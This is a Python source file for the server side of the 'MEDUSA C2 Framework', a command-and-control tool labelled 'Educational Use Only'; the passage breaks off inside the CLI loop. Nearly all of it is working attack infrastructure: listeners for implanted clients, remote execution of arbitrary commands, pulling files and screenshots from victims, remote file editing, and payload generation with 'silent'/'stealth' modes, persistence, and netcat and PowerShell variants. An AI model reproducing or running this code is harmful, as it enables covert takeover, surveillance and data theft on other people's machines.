#!/usr/bin/env python3
"""
MEDUSA C2 Framework - Server
Professional Command & Control Framework
Educational Use Only - Developed for Cybersecurity Learning
"""

import os
import sys
import json
import uuid
import time
import base64
import socket
import hashlib
import threading
import argparse
import logging
import psutil  # Added for system monitoring
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, send_file, send_from_directory
from flask_socketio import SocketIO, emit
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('medusa_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Initialize Flask
app = Flask(__name__, static_folder='static')
app.config['SECRET_KEY'] = os.urandom(32)
socketio = SocketIO(app, cors_allowed_origins="*", logger=False, engineio_logger=False)

# Global variables
clients = {}
listeners = {}
tasks = {}
stagers = {}
server_running = True
start_time = None
performance_data = []  # Store performance history

# Encryption setup
def generate_key(password, salt):
    """Generate encryption key from password and salt"""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return key

# Initialize encryption
ENCRYPTION_KEY = generate_key("medusa_master_key", b"medusa_salt_2024")
cipher_suite = Fernet(ENCRYPTION_KEY)

class C2Task:
    """Represents a task sent to a client"""
    def __init__(self, client_id, command, task_type="command"):
        self.id = str(uuid.uuid4())
        self.client_id = client_id
        self.command = command
        self.type = task_type
        self.status = "pending"  # pending, sent, completed, failed
        self.created_at = datetime.now().isoformat()
        self.sent_at = None
        self.completed_at = None
        self.output = ""
        self.error = ""
    
    def to_dict(self):
        """Convert task to dictionary"""
        return {
            'id': self.id,
            'client_id': self.client_id,
            'command': self.command,
            'type': self.type,
            'status': self.status,
            'created_at': self.created_at,
            'sent_at': self.sent_at,
            'completed_at': self.completed_at,
            'output': self.output,
            'error': self.error
        }

class C2Client:
    """Represents a connected client"""
    def __init__(self, client_id, conn, addr):
        self.id = client_id
        self.conn = conn
        self.addr = addr
        self.connected = True
        self.hostname = "Unknown"
        self.username = "Unknown"
        self.os = "Unknown"
        self.arch = "Unknown"
        self.process_id = "Unknown"
        self.process_name = "Unknown"
        self.ip_address = addr[0]
        self.port = addr[1]
        self.last_seen = datetime.now()
        self.first_seen = datetime.now()
        self.checkin_interval = 30
        self.jitter = 0.2
        self.tasks = []
        self.screenshots = []
        self.files = []
        self.lock = threading.Lock()
        
    def to_dict(self):
        """Convert client to dictionary"""
        with self.lock:
            return {
                'id': self.id,
                'hostname': self.hostname,
                'username': self.username,
                'os': self.os,
                'arch': self.arch,
                'process_id': self.process_id,
                'process_name': self.process_name,
                'ip_address': self.ip_address,
                'port': self.port,
                'connected': self.connected,
                'last_seen': self.last_seen.strftime('%Y-%m-%d %H:%M:%S'),
                'first_seen': self.first_seen.strftime('%Y-%m-%d %H:%M:%S'),
                'checkin_interval': self.checkin_interval,
                'task_count': len(self.tasks),
                'screenshot_count': len(self.screenshots),
                'file_count': len(self.files)
            }
    
    def send_command(self, command):
        """Send command to client"""
        try:
            if not self.connected:
                return False
            
            # Create task
            task = C2Task(self.id, command)
            tasks[task.id] = task.to_dict()
            
            # Create command packet
            packet = {
                'type': 'command',
                'data': command,
                'timestamp': datetime.now().isoformat(),
                'task_id': task.id  # Include task ID
            }
            
            # Send command
            message = json.dumps(packet).encode()
            self.conn.send(len(message).to_bytes(4, byteorder='big'))
            self.conn.send(message)
            
            # Update task status
            task_dict = task.to_dict()
            task_dict['status'] = 'sent'
            task_dict['sent_at'] = datetime.now().isoformat()
            tasks[task.id] = task_dict
            
            logger.info(f"Sent command to {self.id}: {command[:50]}...")
            return task.id  # Return task ID
            
        except Exception as e:
            logger.error(f"Error sending command to {self.id}: {e}")
            self.connected = False
            return False
    
    def receive_data(self):
        """Receive data from client"""
        try:
            if not self.connected:
                return None
                
            # Receive message length
            length_bytes = self.conn.recv(4)
            if not length_bytes:
                return None
                
            message_length = int.from_bytes(length_bytes, byteorder='big')
            
            # Receive message
            message = b''
            while len(message) < message_length:
                chunk = self.conn.recv(message_length - len(message))
                if not chunk:
                    return None
                message += chunk
            
            # Parse message
            data = json.loads(message.decode())
            self.last_seen = datetime.now()
            
            return data
            
        except Exception as e:
            logger.error(f"Error receiving data from {self.id}: {e}")
            self.connected = False
            return None
    
    def disconnect(self):
        """Disconnect client"""
        with self.lock:
            self.connected = False
            try:
                self.conn.close()
            except:
                pass

class C2Listener:
    """TCP Listener for incoming connections"""
    def __init__(self, name, host, port):
        self.name = name
        self.host = host
        self.port = port
        self.socket = None
        self.running = False
        self.thread = None
        self.clients_connected = 0
        
    def start(self):
        """Start the listener"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(10)
            
            self.running = True
            self.thread = threading.Thread(target=self._listen_thread)
            self.thread.daemon = True
            self.thread.start()
            
            logger.info(f"Listener '{self.name}' started on {self.host}:{self.port}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start listener '{self.name}': {e}")
            return False
    
    def stop(self):
        """Stop the listener"""
        try:
            self.running = False
            if self.socket:
                self.socket.close()
            
            # Wait for thread to finish
            if self.thread and self.thread.is_alive():
                self.thread.join(timeout=2)
            
            logger.info(f"Listener '{self.name}' stopped successfully")
            return True
        except Exception as e:
            logger.error(f"Error stopping listener '{self.name}': {e}")
            return False
    
    def _listen_thread(self):
        """Main listening thread"""
        while self.running:
            try:
                conn, addr = self.socket.accept()
                logger.info(f"New connection from {addr[0]}:{addr[1]}")
                
                # Handle the connection
                client_thread = threading.Thread(
                    target=self._handle_connection, 
                    args=(conn, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    logger.error(f"Listener error: {e}")
    
    def _handle_connection(self, conn, addr):
        """Handle incoming connection"""
        client_id = None
        try:
            # Set socket timeout for handshake
            conn.settimeout(30)
            
            # Wait for initial handshake
            length_bytes = conn.recv(4)
            if not length_bytes:
                conn.close()
                return
                
            message_length = int.from_bytes(length_bytes, byteorder='big')
            message = conn.recv(message_length).decode()
            
            handshake = json.loads(message)
            
            if handshake.get('type') == 'handshake':
                client_id = handshake.get('client_id', str(uuid.uuid4()))
                
                # Create client object
                client = C2Client(client_id, conn, addr)
                
                # Update client info from handshake
                if 'system_info' in handshake:
                    info = handshake['system_info']
                    client.hostname = info.get('hostname', 'Unknown')
                    client.username = info.get('username', 'Unknown')
                    client.os = info.get('os', 'Unknown')
                    client.arch = info.get('arch', 'Unknown')
                    client.process_id = str(info.get('process_id', 'Unknown'))
                    client.process_name = info.get('process_name', 'Unknown')
                
                # Add to clients list
                clients[client_id] = client
                self.clients_connected += 1
                
                # Remove timeout for long-term connection
                conn.settimeout(None)
                
                # Send acknowledgment
                ack = {
                    'type': 'ack',
                    'client_id': client_id,
                    'timestamp': datetime.now().isoformat()
                }
                ack_message = json.dumps(ack).encode()
                conn.send(len(ack_message).to_bytes(4, byteorder='big'))
                conn.send(ack_message)
                
                # Notify web interface
                socketio.emit('client_connected', client.to_dict())
                
                logger.info(f"Client {client_id} connected: {client.hostname} ({client.username})")
                
                # Start client handler
                self._handle_client(client)
                
        except Exception as e:
            logger.error(f"Connection handling error: {e}")
        finally:
            # Clean up
            if client_id and client_id in clients:
                client = clients[client_id]
                client.disconnect()
                del clients[client_id]
                self.clients_connected -= 1
                socketio.emit('client_disconnected', {'id': client_id})
                logger.info(f"Client {client_id} disconnected")
    
    def _handle_client(self, client):
        """Handle client communication"""
        while client.connected and self.running:
            try:
                # Receive data from client
                data = client.receive_data()
                if not data:
                    break
                
                # Handle different message types
                msg_type = data.get('type')
                
                if msg_type == 'heartbeat':
                    # Update last seen
                    client.last_seen = datetime.now()
                    
                elif msg_type == 'command_response':
                    # Handle command response
                    task_id = data.get('task_id')
                    output = data.get('output', '')
                    error = data.get('error', '')
                    
                    # Update task if exists
                    if task_id and task_id in tasks:
                        task = tasks[task_id]
                        task['status'] = 'completed'
                        task['output'] = output
                        task['error'] = error
                        task['completed_at'] = datetime.now().isoformat()
                        
                        # Notify web interface
                        socketio.emit('task_updated', task)
                    
                    logger.info(f"Received response from {client.id} for task {task_id}")
                
                elif msg_type == 'file_data':
                    # Handle file upload/download
                    filename = data.get('filename')
                    file_data = data.get('data')
                    
                    if filename and file_data:
                        client.files.append({
                            'filename': filename,
                            'size': len(file_data),
                            'timestamp': datetime.now().isoformat()
                        })
                        
                        # Save file
                        os.makedirs('downloads', exist_ok=True)
                        filepath = os.path.join('downloads', f"{client.id}_{filename}")
                        with open(filepath, 'wb') as f:
                            f.write(base64.b64decode(file_data))
                        
                        # Notify web interface about successful download
                        socketio.emit('file_received', {
                            'client_id': client.id,
                            'filename': filename,
                            'filepath': filepath,
                            'size': len(file_data)
                        })
                        
                        logger.info(f"Received file from {client.id}: {filename} ({len(file_data)} bytes)")
                
                elif msg_type == 'file_content':
                    # Handle file content for editing
                    task_id = data.get('task_id')
                    filepath = data.get('filepath')
                    content = data.get('content')
                    
                    # Notify web interface
                    socketio.emit('file_content', {
                        'client_id': client.id,
                        'filepath': filepath,
                        'content': content
                    })
                    
                    logger.info(f"Received file content from {client.id}: {filepath}")
                
                elif msg_type == 'screenshot':
                    # Handle screenshot
                    screenshot_data = data.get('data')
                    if screenshot_data:
                        client.screenshots.append({
                            'timestamp': datetime.now().isoformat(),
                            'size': len(screenshot_data)
                        })
                        
                        # Save screenshot
                        os.makedirs('screenshots', exist_ok=True)
                        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                        filepath = os.path.join('screenshots', f"{client.id}_{timestamp}.png")
                        with open(filepath, 'wb') as f:
                            f.write(base64.b64decode(screenshot_data))
                        
                        # Notify web interface
                        socketio.emit('screenshot_received', {
                            'client_id': client.id,
                            'filename': f"{client.id}_{timestamp}.png"
                        })
                        
                        logger.info(f"Received screenshot from {client.id}")
                
            except Exception as e:
                logger.error(f"Client handling error for {client.id}: {e}")
                break
        
        # Client disconnected
        client.disconnect()

# Flask Routes
@app.route('/')
def index():
    """Main dashboard"""
    return send_from_directory('webui', 'dashboard.html')

@app.route('/css/<path:filename>')
def serve_css(filename):
    """Serve CSS files"""
    return send_from_directory('webui/css', filename)

@app.route('/js/<path:filename>')
def serve_js(filename):
    """Serve JS files"""
    return send_from_directory('webui/js', filename)

@app.route('/api/status')
def api_status():
    """Get server status"""
    return jsonify({
        'status': 'running',
        'clients': len(clients),
        'listeners': len(listeners),
        'tasks': len(tasks),
        'uptime': time.time() - start_time
    })

@app.route('/api/clients')
def api_clients():
    """Get all clients"""
    client_list = []
    for client in clients.values():
        client_list.append(client.to_dict())
    return jsonify(client_list)

@app.route('/api/clients/<client_id>')
def api_client_details(client_id):
    """Get specific client details"""
    if client_id in clients:
        return jsonify(clients[client_id].to_dict())
    return jsonify({'error': 'Client not found'}), 404

@app.route('/api/tasks')
def api_tasks():
    """Get all tasks"""
    client_id = request.args.get('client_id')
    task_list = []
    
    for task in tasks.values():
        if not client_id or task['client_id'] == client_id:
            task_list.append(task)
    
    # Sort by creation time (newest first)
    task_list.sort(key=lambda x: x['created_at'], reverse=True)
    return jsonify(task_list)

@app.route('/api/listeners')
def api_listeners():
    """Get all listeners"""
    listener_list = []
    for name, listener in listeners.items():
        listener_list.append({
            'name': name,
            'host': listener.host,
            'port': listener.port,
            'running': listener.running,
            'clients_connected': listener.clients_connected
        })
    return jsonify(listener_list)

@app.route('/api/listeners/<listener_name>/start', methods=['POST'])
def api_start_listener(listener_name):
    """Start a listener via HTTP API"""
    try:
        if listener_name not in listeners:
            return jsonify({'success': False, 'error': 'Listener not found'}), 404
        
        listener = listeners[listener_name]
        
        if listener.running:
            return jsonify({'success': False, 'error': 'Listener is already running'})
        
        if listener.start():
            logger.info(f"Listener '{listener_name}' started via HTTP API")
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Failed to start listener'})
        
    except Exception as e:
        logger.error(f"HTTP API listener start failed: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/listeners/<listener_name>/stop', methods=['POST'])
def api_stop_listener(listener_name):
    """Stop a listener via HTTP API"""
    try:
        if listener_name not in listeners:
            return jsonify({'success': False, 'error': 'Listener not found'}), 404
        
        # Don't allow stopping the default listener while it has clients
        if listener_name == 'Default' and len(clients) > 0:
            return jsonify({'success': False, 'error': 'Cannot stop Default listener while clients are connected'})
        
        listener = listeners[listener_name]
        
        if not listener.running:
            return jsonify({'success': False, 'error': 'Listener is not running'})
        
        if listener.stop():
            logger.info(f"Listener '{listener_name}' stopped via HTTP API")
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Failed to stop listener - check logs'})
        
    except Exception as e:
        logger.error(f"HTTP API listener stop failed: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/listeners/<listener_name>', methods=['DELETE'])
def api_delete_listener(listener_name):
    """Delete a listener via HTTP API"""
    try:
        if listener_name not in listeners:
            return jsonify({'success': False, 'error': 'Listener not found'}), 404
        
        # Don't allow deleting the default listener
        if listener_name == 'Default':
            return jsonify({'success': False, 'error': 'Cannot delete the default listener'})
        
        listener = listeners[listener_name]
        
        # Stop listener if running
        if listener.running:
            listener.stop()
        
        # Remove from listeners dict
        del listeners[listener_name]
        
        logger.info(f"Listener '{listener_name}' deleted via HTTP API")
        return jsonify({'success': True})
        
    except Exception as e:
        logger.error(f"HTTP API listener deletion failed: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/execute', methods=['POST'])
def api_execute_command():
    """Execute command via HTTP API"""
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        command = data.get('command')
        
        if not client_id or not command:
            return jsonify({'success': False, 'error': 'Missing client_id or command'})
        
        if client_id not in clients:
            return jsonify({'success': False, 'error': 'Client not found'})
        
        client = clients[client_id]
        
        # Send command to client
        task_id = client.send_command(command)
        
        if task_id:
            logger.info(f"Command sent to {client_id} via HTTP API: {command}")
            return jsonify({'success': True, 'task_id': task_id})
        else:
            return jsonify({'success': False, 'error': 'Failed to send command to client'})
        
    except Exception as e:
        logger.error(f"HTTP API command execution failed: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/listeners', methods=['POST'])
def api_create_listener():
    """Create a new listener via HTTP API"""
    try:
        data = request.get_json()
        name = data.get('name')
        host = data.get('host', '0.0.0.0')
        port = data.get('port')
        
        if not name or not port:
            return jsonify({'success': False, 'error': 'Missing name or port'})
        
        if name in listeners:
            return jsonify({'success': False, 'error': f'Listener {name} already exists'})
        
        # Create new listener
        listener = C2Listener(name, host, port)
        listeners[name] = listener
        
        logger.info(f"Listener '{name}' created on {host}:{port} via HTTP API")
        return jsonify({'success': True})
        
    except Exception as e:
        logger.error(f"HTTP API listener creation failed: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

def get_system_performance():
    """Get current system performance metrics"""
    try:
        # CPU usage
        cpu_percent = psutil.cpu_percent(interval=1)
        
        # Memory usage
        memory = psutil.virtual_memory()
        memory_percent = memory.percent
        
        # Network I/O
        net_io = psutil.net_io_counters()
        network_data = {
            'bytes_sent': net_io.bytes_sent,
            'bytes_recv': net_io.bytes_recv,
            'packets_sent': net_io.packets_sent,
            'packets_recv': net_io.packets_recv
        }
        
        # Disk usage
        disk = psutil.disk_usage('/')
        disk_percent = (disk.used / disk.total) * 100
        
        return {
            'cpu': cpu_percent,
            'memory': memory_percent,
            'disk': disk_percent,
            'network': network_data,
            'timestamp': datetime.now().isoformat()
        }
    except Exception as e:
        logger.error(f"Error getting system performance: {e}")
        return {
            'cpu': 0,
            'memory': 0,
            'disk': 0,
            'network': {},
            'timestamp': datetime.now().isoformat()
        }

# Additional API Routes for Enhanced Features
@app.route('/api/performance')
def api_performance():
    """Get current system performance metrics"""
    perf_data = get_system_performance()
    return jsonify(perf_data)

@app.route('/api/performance/history')
def api_performance_history():
    """Get historical performance data"""
    # Return last 60 data points (last 30 minutes if collected every 30 seconds)
    return jsonify(performance_data[-60:] if len(performance_data) > 60 else performance_data)

@app.route('/api/settings', methods=['GET', 'POST'])
def api_settings():
    """Get or update framework settings"""
    settings_file = 'medusa_settings.json'
    
    if request.method == 'GET':
        # Return current settings
        if os.path.exists(settings_file):
            try:
                with open(settings_file, 'r') as f:
                    settings = json.load(f)
                return jsonify(settings)
            except Exception as e:
                logger.error(f"Error reading settings: {e}")
                return jsonify({})
        else:
            # Return default settings
            default_settings = {
                'theme': {
                    'primary': '#bd93f9',
                    'accent': '#ff79c6',
                    'success': '#50fa7b',
                    'background': '#282a36'
                },
                'alerts': {
                    'clientConnect': True,
                    'clientDisconnect': True,
                    'fileTransfer': True,
                    'error': True
                },
                'logging': {
                    'level': 'INFO',
                    'retention': 7,
                    'fileLogging': True
                },
                'analytics': {
                    'enabled': True,
                    'historicalData': True,
                    'interval': 30
                }
            }
            return jsonify(default_settings)
    
    elif request.method == 'POST':
        # Update settings
        try:
            settings = request.get_json()
            with open(settings_file, 'w') as f:
                json.dump(settings, f, indent=2)
            return jsonify({'success': True})
        except Exception as e:
            logger.error(f"Error saving settings: {e}")
            return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/logs')
def api_logs():
    """Get recent log entries"""
    log_file = 'medusa_server.log'
    if os.path.exists(log_file):
        try:
            with open(log_file, 'r') as f:
                lines = f.readlines()
                # Return last 100 lines
                return jsonify(lines[-100:] if len(lines) > 100 else lines)
        except Exception as e:
            logger.error(f"Error reading logs: {e}")
            return jsonify([]), 500
    else:
        return jsonify([])

# WebSocket Events
@socketio.on('connect')
def handle_connect():
    """Handle WebSocket connection"""
    logger.info(f"WebSocket client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    """Handle WebSocket disconnection"""
    logger.info(f"WebSocket client disconnected: {request.sid}")

@socketio.on('execute_command')
def handle_execute_command(data):
    """Execute command on client"""
    client_id = data.get('client_id')
    command = data.get('command')
    
    if not client_id or not command:
        emit('error', {'message': 'Missing client_id or command'})
        return
    
    if client_id not in clients:
        emit('error', {'message': 'Client not found'})
        return
    
    client = clients[client_id]
    
    # Send command to client (this now creates and returns task_id)
    task_id = client.send_command(command)
    
    if task_id:
        # Get the created task
        task_dict = tasks[task_id]
        emit('task_created', task_dict)
        logger.info(f"Command sent to {client_id}: {command}")
    else:
        emit('error', {'message': 'Failed to send command to client'})
        logger.error(f"Failed to send command to {client_id}: {command}")

@socketio.on('get_screenshot')
def handle_get_screenshot(data):
    """Request screenshot from client"""
    client_id = data.get('client_id')
    
    if client_id not in clients:
        emit('error', {'message': 'Client not found'})
        return
    
    client = clients[client_id]
    
    # Send screenshot command
    if client.send_command('screenshot'):
        emit('screenshot_requested', {'client_id': client_id})
        logger.info(f"Screenshot requested from {client_id}")
    else:
        emit('error', {'message': 'Failed to request screenshot'})


@socketio.on('create_folder')
def handle_create_folder(data):
    """Create folder on client"""
    client_id = data.get('client_id')
    path = data.get('path')
    
    if not client_id or not path:
        emit('error', {'message': 'Missing client_id or path'})
        return
    
    if client_id not in clients:
        emit('error', {'message': 'Client not found'})
        return
    
    client = clients[client_id]
    
    # Send mkdir command
    mkdir_cmd = f"mkdir {path}"
    if client.send_command(mkdir_cmd):
        emit('folder_create_requested', {'client_id': client_id, 'path': path})
        logger.info(f"Folder create requested on {client_id}: {path}")
    else:
        emit('error', {'message': 'Failed to create folder'})

@socketio.on('get_file_content')
def handle_get_file_content(data):
    """Get file content for editing"""
    client_id = data.get('client_id')
    file_path = data.get('file_path')
    
    if not client_id or not file_path:
        emit('error', {'message': 'Missing client_id or file_path'})
        return
    
    if client_id not in clients:
        emit('error', {'message': 'Client not found'})
        return
    
    client = clients[client_id]
    
    # Send get content command with proper path formatting
    content_cmd = f"get_content \"{file_path}\""
    if client.send_command(content_cmd):
        emit('content_requested', {'client_id': client_id, 'file_path': file_path})
        logger.info(f"File content requested from {client_id}: {file_path}")
    else:
        emit('error', {'message': 'Failed to get file content'})

@socketio.on('save_file')
def handle_save_file(data):
    """Save file content"""
    client_id = data.get('client_id')
    file_path = data.get('file_path')
    content = data.get('content')
    
    if not client_id or not file_path or content is None:
        emit('error', {'message': 'Missing client_id, file_path, or content'})
        return
    
    if client_id not in clients:
        emit('error', {'message': 'Client not found'})
        return
    
    client = clients[client_id]
    
    # Encode content as base64
    content_b64 = base64.b64encode(content.encode('utf-8')).decode('ascii')
    
    # Send save content command with proper path formatting
    save_cmd = f"save_content \"{file_path}\" {content_b64}"
    if client.send_command(save_cmd):
        emit('file_saved', {'client_id': client_id, 'file_path': file_path})
        logger.info(f"File save requested to {client_id}: {file_path}")
    else:
        emit('error', {'message': 'Failed to save file'})

@socketio.on('upload_file')
def handle_upload_file(data):
    """Upload file to client"""
    client_id = data.get('client_id')
    file_name = data.get('file_name')
    file_data = data.get('file_data')
    upload_path = data.get('upload_path')
    
    if not client_id or not file_name or not file_data or not upload_path:
        emit('error', {'message': 'Missing required upload data'})
        return
    
    if client_id not in clients:
        emit('error', {'message': 'Client not found'})
        return
    
    client = clients[client_id]
    
    # Construct full file path properly for Windows
    if not upload_path.endswith('\\') and not upload_path.endswith('/'):
        file_path = f"{upload_path}\\{file_name}"
    else:
        file_path = f"{upload_path}{file_name}"
    
    # Send upload command with proper formatting
    upload_cmd = f"upload \"{file_path}\" {file_data}"
    if client.send_command(upload_cmd):
        emit('file_uploaded', {'client_id': client_id, 'file_path': file_path})
        logger.info(f"File upload requested to {client_id}: {file_path}")
    else:
        emit('error', {'message': 'Failed to upload file'})

@socketio.on('download_file')
def handle_download_file(data):
    """Download file from client"""
    client_id = data.get('client_id')
    file_path = data.get('file_path')
    
    if not client_id or not file_path:
        emit('error', {'message': 'Missing client_id or file_path'})
        return
    
    if client_id not in clients:
        emit('error', {'message': 'Client not found'})
        return
    
    client = clients[client_id]
    
    # Send download command with proper path formatting
    download_cmd = f"download \"{file_path}\""
    if client.send_command(download_cmd):
        emit('download_requested', {'client_id': client_id, 'file_path': file_path})
        logger.info(f"File download requested from {client_id}: {file_path}")
    else:
        emit('error', {'message': 'Failed to request file download'})

@socketio.on('generate_payload')
def handle_generate_payload(data):
    """Generate payload using builder"""
    try:
        from builder import PayloadBuilder
        
        payload_type = data.get('type')
        server_ip = data.get('ip')
        server_port = data.get('port')
        output_name = data.get('output', 'client')
        payload_mode = data.get('payload_mode', 'silent')  # Default to silent
        persistence = data.get('persistence', False)
        build_exe = data.get('build_exe', False)
        
        logger.info(f"Starting payload generation: {payload_type} for {server_ip}:{server_port} (Mode: {payload_mode})")
        
        # Map payload modes to hide_console setting
        hide_console = payload_mode in ['silent', 'stealth']
        
        builder = PayloadBuilder()
        result = {}
        
        if payload_type == 'python':
            logger.info(f"Generating Python client: {output_name}")
            py_file = builder.generate_python_client(
                server_ip, server_port, output_name, hide_console, persistence
            )
            result['python_file'] = py_file
            logger.info(f"Python file generated: {py_file}")
            
            if build_exe:
                logger.info(f"Building executable with mode: {payload_mode}")
                exe_file = builder.build_executable(
                    py_file, output_name, hide_console, payload_mode
                )
                if exe_file and os.path.exists(exe_file):
                    result['exe_file'] = exe_file
                    file_size = os.path.getsize(exe_file)
                    logger.info(f"EXE built successfully: {exe_file} (Size: {file_size} bytes, Mode: {payload_mode})")
                else:
                    logger.warning(f"EXE build failed or file not found for {output_name}")
                    
        elif payload_type == 'netcat':
            logger.info("Generating Netcat payloads")
            payloads = builder.generate_netcat_payload(server_ip, server_port)
            result['commands'] = payloads
            
        elif payload_type == 'powershell':
            logger.info("Generating PowerShell payloads")
            payloads = builder.generate_powershell_payload(server_ip, server_port)
            result['script'] = payloads
        
        emit('payload_generated', {
            'success': True,
            'type': payload_type,
            'mode': payload_mode,
            'persistence': persistence,
            'result': result,
            'timestamp': datetime.now().isoformat()
        })
        
        logger.info(f"Payload generation completed successfully: {payload_type} for {server_ip}:{server_port}")
        
    except Exception as e:
        error_msg = f"Payload generation failed: {str(e)}"
        logger.error(error_msg)
        emit('payload_generated', {
            'success': False,
            'error': error_msg,
            'timestamp': datetime.now().isoformat()
        })

@socketio.on('create_listener')
def handle_create_listener(data):
    """Create a new listener"""
    try:
        name = data.get('name')
        host = data.get('host', '0.0.0.0')
        port = data.get('port')
        
        if not name or not port:
            emit('listener_error', {'message': 'Missing name or port'})
            return
        
        if name in listeners:
            emit('listener_error', {'message': f'Listener {name} already exists'})
            return
        
        # Create new listener
        listener = C2Listener(name, host, port)
        listeners[name] = listener
        
        emit('listener_created', {
            'name': name,
            'host': host,
            'port': port
        })
        
        logger.info(f"Listener '{name}' created on {host}:{port}")
        
    except Exception as e:
        emit('listener_error', {'message': f'Failed to create listener: {str(e)}'})
        logger.error(f"Listener creation failed: {e}")

@socketio.on('start_listener')
def handle_start_listener(data):
    """Start a listener"""
    try:
        name = data.get('name')
        
        if not name or name not in listeners:
            emit('listener_error', {'message': 'Listener not found'})
            return
        
        listener = listeners[name]
        
        if listener.running:
            emit('listener_error', {'message': 'Listener is already running'})
            return
        
        if listener.start():
            emit('listener_started', {'name': name})
            logger.info(f"Listener '{name}' started")
        else:
            emit('listener_error', {'message': 'Failed to start listener'})
            logger.error(f"Failed to start listener '{name}'")
        
    except Exception as e:
        emit('listener_error', {'message': f'Failed to start listener: {str(e)}'})
        logger.error(f"Listener start failed: {e}")

@socketio.on('stop_listener')
def handle_stop_listener(data):
    """Stop a listener"""
    try:
        name = data.get('name')
        
        if not name or name not in listeners:
            emit('listener_error', {'message': 'Listener not found'})
            return
        
        # Don't allow stopping the default listener while it has clients
        if name == 'Default' and len(clients) > 0:
            emit('listener_error', {'message': 'Cannot stop Default listener while clients are connected'})
            return
        
        listener = listeners[name]
        
        if not listener.running:
            emit('listener_error', {'message': 'Listener is not running'})
            return
        
        if listener.stop():
            emit('listener_stopped', {'name': name})
            logger.info(f"Listener '{name}' stopped")
        else:
            emit('listener_error', {'message': 'Failed to stop listener - check logs'})
        
    except Exception as e:
        emit('listener_error', {'message': f'Failed to stop listener: {str(e)}'})
        logger.error(f"Listener stop failed: {e}")

@socketio.on('delete_listener')
def handle_delete_listener(data):
    """Delete a listener"""
    try:
        name = data.get('name')
        
        if not name or name not in listeners:
            emit('listener_error', {'message': 'Listener not found'})
            return
        
        # Don't allow deleting the default listener
        if name == 'Default':
            emit('listener_error', {'message': 'Cannot delete the default listener'})
            return
        
        listener = listeners[name]
        
        # Stop listener if running
        if listener.running:
            listener.stop()
        
        # Remove from listeners dict
        del listeners[name]
        
        emit('listener_deleted', {'name': name})
        logger.info(f"Listener '{name}' deleted")
        
    except Exception as e:
        emit('listener_error', {'message': f'Failed to delete listener: {str(e)}'})
        logger.error(f"Listener deletion failed: {e}")

def create_default_listener():
    """Create default listener"""
    listener = C2Listener("Default", "0.0.0.0", 4444)
    if listener.start():
        listeners["Default"] = listener
        logger.info("Default listener created on port 4444")
        return True
    return False

def start_cli():
    """Start CLI interface"""
    def cli_thread():
        print("\n" + "="*60)
        print("MEDUSA C2 Framework - Command Line Interface")
        print("Educational Use Only")
        print("="*60)
        print("Commands:")
        print("  clients        - List connected clients")
        print("  tasks          - List recent tasks")
        print("  listeners      - List active listeners")
        print("  exec <id> <cmd> - Execute command on client")
        print("  screenshot <id> - Take screenshot from client")
        print("  help           - Show this help")
        print("  exit           - Exit server")
        print("="*60)
        
        while server_running:
            try:
                cmd = input("\nmedusa> ").strip()
                if not cmd:
                    continue
                
                parts = cmd.split(' ', 2)
                command = parts[0].lower()
                
                if command == 'exit':
                    break
                elif command == 'help':
                    print("Available commands:")
                    print("  clients, tasks, listeners, exec <id> <cmd>, screenshot <id>, help, exit")
                
                elif command == 'clients':
                    if not clients:
                        print("No clients connected")
                    else:
                        print(f"\n{'ID':<12} {'Hostname':<15} {'Username':<12} {'OS':<15} {'Last Seen':<20}")
                        print("-" * 80)
                        for client in clients.values():
                            print(f"{client.id[:12]:<12} {client.hostname[:15]:<15} {client.username[:12]:<12} {client.os[:15]:<15} {client.last_seen.strftime('%Y-%m-%d %H:%M'):<20}")
                
                elif command == 'tasks':
                    if not tasks:
                        print("No tasks found")
                    else:
                        print(f"\n{'Task ID':<12} {'Client':<12} {'Command':<30} {'Status':<10}")
                        print("-" * 70)
                        recent_tasks = sorted(tasks.values(), key=lambda x: x['created_at'], reverse=True)[:10]
                        for task in recent_tasks:
                            cmd_preview = task['command'][:30] + "..." if len(task['command']) > 30 else task['command']
                            print(f"{task['id'][:12]:<12} {task['client_id'][:12]:<12} {cmd_preview:<30} {task['status']:<10}")
                
                elif command == 'listeners':
                    if not listeners:
                        print("No listeners active")
                    else:
                        print(f"\n{'Name':<12} {'Host':<15} {'Port':<6} {'Status':<8} {'Clients':<8}")
                        print("-" * 50)
                        for name, listener in listeners.items():
                            status = "Running" if listener.running else "Stopped"
                            print(f"{name:<12} {listener.host:<15} {listener.port:<6} {status:<8} {listener.clients_connected:<8}")
                
                elif command == 'exec' and len(parts) >= 3:
                    client_id = parts[1]
                    exec_cmd = parts[2]
                    
                    # Find client by partial ID
                    target_client = None
                    for cid, client in clients.items():
                        if cid.startswith(client_id):
                            target_client = client
                            break
                    
                    if target_client:
                        task = C2Task(target_client.id, exec_cmd)
                        tasks[task.id] = task.to_dict()
                        
                        if target_client.send_command(exec_cmd):
                            print(f"Command sent to {target_client.hostname}: {exec_cmd}")
                        else:
                            print(f"Failed to send command to {target_client.hostname}")
                    else:
                        print(f"Client not found: {client_id}")
                
                elif command == 'screenshot' and len(parts) >= 2:
